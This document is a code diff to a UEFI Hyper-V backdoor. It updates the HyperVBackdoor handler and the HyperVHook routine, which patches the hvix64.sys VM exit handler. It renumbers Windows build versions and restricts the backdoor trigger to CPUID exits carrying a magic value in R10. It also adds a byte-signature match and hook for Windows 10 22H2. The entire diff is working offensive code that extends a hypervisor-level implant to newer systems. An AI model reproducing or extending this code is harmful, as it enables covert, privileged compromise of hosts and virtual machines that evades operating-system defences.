@@ -93,7 +93,7 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
     UINT64 ExitReason = 0;
     VM_GUEST_STATE *Context = NULL;
 
-    if (BackdoorData->Version >= 1809)
+    if (BackdoorData->Version >= 17763)
     {
         // 1-st argument is address of guest saved state pointer
         Context = *(VM_GUEST_STATE **)arg_1;        
@@ -108,7 +108,7 @@ VOID HyperVBackdoor(VOID *arg_1, VOID *arg_2, VOID *arg_3, VOID *arg_4)
     __vmx_vmread(VM_EXIT_REASON, &ExitReason);
 
     // check for request from the client
-    if (Context->R10 == HVBD_VM_EXIT_MAGIC)
+    if (ExitReason == VM_EXIT_CPUID && Context->R10 == HVBD_VM_EXIT_MAGIC)
     {        
         EFI_STATUS Status = EFI_INVALID_PARAMETER;        
 
@@ -482,7 +482,7 @@ VOID *HyperVHook(VOID *Image)
                 {
                     Func = (UINT8 *)JUMP32_ADDR(Func + 0x86);
                     HookLen = 5;
-                    Version = 1709;                    
+                    Version = 16299;
                 }
                 /*
                     Match hvix64.sys VM exit handler signature for Windows 10 1803:
@@ -515,7 +515,7 @@ VOID *HyperVHook(VOID *Image)
                 {
                     Func = (UINT8 *)JUMP32_ADDR(Func + 0xd7);
                     HookLen = 5;
-                    Version = 1803;                    
+                    Version = 17134;
                 }
                 /*
                     Match hvix64.sys VM exit handler signature for Windows 10 1809:
@@ -546,7 +546,7 @@ VOID *HyperVHook(VOID *Image)
                 {
                     Func = (UINT8 *)JUMP32_ADDR(Func + 0x11e);
                     HookLen = 8;
-                    Version = 1809;                    
+                    Version = 17763;
                 }
                 /*
                     Match hvix64.sys VM exit handler signature for Windows 10 1903 and 1909:
@@ -577,7 +577,7 @@ VOID *HyperVHook(VOID *Image)
                 {
                     Func = (UINT8 *)JUMP32_ADDR(Func + 0x118);
                     HookLen = 8;
-                    Version = 1903;                    
+                    Version = 18362;
                 }
                 /*
                     Match hvix64.sys VM exit handler signature for Windows 10 2004:
@@ -609,7 +609,41 @@ VOID *HyperVHook(VOID *Image)
                 {
                     Func = (UINT8 *)JUMP32_ADDR(Func + 0xce);
                     HookLen = 5;
-                    Version = 2004;                    
+                    Version = 19041;
+                }
+                /*
+                    Match hvix64.sys VM exit handler signature for Windows 10 22H2:
+
+                        ...
+
+                        .text:FFFFF8000023E313      mov     [rsp+arg_20], rcx
+                        .text:FFFFF8000023E318      mov     rcx, [rsp+arg_18]
+                        .text:FFFFF8000023E31D      mov     rcx, [rcx]
+                        .text:FFFFF8000023E320      mov     [rcx], rax
+                        .text:FFFFF8000023E323      mov     [rcx+10h], rdx
+                        
+                        ...
+
+                        .text:FFFFF8000023E353      mov     [rcx+78h], r15
+                        .text:FFFFF8000023E357      mov     rax, [rsp+arg_20]
+                        .text:FFFFF8000023E35C      mov     [rcx+8], rax
+                        .text:FFFFF8000023E360      lea     rax, [rcx+70h]
+                        
+                        ...
+
+                        .text:FFFFF8000023E3D5      mov     rcx, [rsp+arg_18]
+                        .text:FFFFF8000023E3DA      mov     rdx, [rsp+arg_28]
+                        .text:FFFFF8000023E3DF      call    sub_FFFFF800002118D0
+                */
+                else if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
+                         *(Func + 0x0d) == 0x48 && *(Func + 0x0e) == 0x89 && *(Func + 0x0f) == 0x01 && 
+                         *(Func + 0x10) == 0x48 && *(Func + 0x11) == 0x89 && *(Func + 0x12) == 0x51 && *(Func + 0x13) == 0x10 &&
+                         *(Func + 0x40) == 0x4c && *(Func + 0x41) == 0x89 && *(Func + 0x42) == 0x79 && *(Func + 0x43) == 0x78 &&
+                         *(Func + 0xcc) == 0xe8)
+                {
+                    Func = (UINT8 *)JUMP32_ADDR(Func + 0xcc);
+                    HookLen = 5;
+                    Version = 19045;
                 }
                 else
                 {
